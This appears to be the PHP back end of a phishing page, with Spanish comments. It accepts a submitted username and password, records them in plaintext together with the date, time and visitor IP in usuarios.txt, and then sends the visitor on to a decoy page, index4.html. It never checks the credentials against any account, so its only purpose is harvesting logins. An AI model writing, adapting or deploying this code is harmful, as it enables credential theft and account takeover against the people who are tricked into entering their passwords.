<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Recoger y limpiar los datos del formulario
    $usuario  = isset($_POST['usuario']) ? trim($_POST['usuario']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';

    // Verificar que los campos no estén vacíos
    if (!empty($usuario) && !empty($password)) {

        // Capturar fecha, hora e IP del usuario
        date_default_timezone_set('America/Caracas');
        $fecha_hora = date('Y-m-d H:i:s');

        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        // Formato de la línea a guardar en el archivo de texto
        $linea = "Fecha: {$fecha_hora} | IP: {$ip} | Usuario: {$usuario} | Contraseña: {$password}" . PHP_EOL;

        // Guardar la información en el archivo usuarios.txt (FILE_APPEND añade la información al final)
        file_put_contents('usuarios.txt', $linea, FILE_APPEND | LOCK_EX);
    }

    // URL de destino a la que quieres redirigir
    $enlace_destino = "index4.html";

    // Redirección inmediata
    header("Location: " . $enlace_destino);
    exit();

} else {
    // Si intentan ingresar al archivo directamente por la URL
    header("HTTP/1.1 405 Method Not Allowed");
    echo "Método no permitido.";
    exit();
}
?>